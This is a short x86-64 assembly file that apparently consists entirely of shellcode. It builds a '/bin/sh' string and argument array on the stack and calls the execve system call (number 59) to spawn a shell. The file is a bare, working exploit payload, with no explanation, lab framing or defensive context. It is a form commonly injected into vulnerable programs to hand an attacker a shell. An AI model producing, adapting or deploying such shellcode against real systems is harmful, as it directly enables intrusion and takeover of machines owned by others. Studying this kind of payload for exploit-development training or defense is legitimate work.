BITS 64
    xor rdx, rdx
    mov rbx, `/bin/sh`
    push rbx
    mov rdi, rsp

    mov rax, 0
    push rax
    push rdi

    mov rsi, rsp
    mov rax, 59
    syscall
